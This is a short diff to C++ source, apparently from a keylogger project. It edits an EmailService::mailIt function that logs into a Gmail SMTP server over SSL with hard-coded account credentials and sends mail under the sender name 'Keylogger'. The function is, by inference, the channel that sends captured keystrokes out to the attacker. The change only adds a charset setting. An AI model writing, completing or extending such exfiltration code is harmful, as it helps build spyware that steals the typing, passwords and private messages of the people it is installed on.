@@ -9,8 +9,10 @@ int EmailService::mailIt(const char *emailto, const char *emailsubject, const ch
 		CSmtp mail;
 		mail.SetSMTPServer(GMAIL_SERVER, GMAIL_PORT);
 		mail.SetSecurityType(USE_SSL);
+
 		mail.SetLogin(EMAIL_LOGIN);
 		mail.SetPassword(EMAIL_PASSWORD);
+		mail.SetCharSet("ascii");
 		mail.SetSenderName("Keylogger");
 		mail.SetSenderMail(EMAIL_LOGIN);
 		mail.SetSubject(emailsubject);
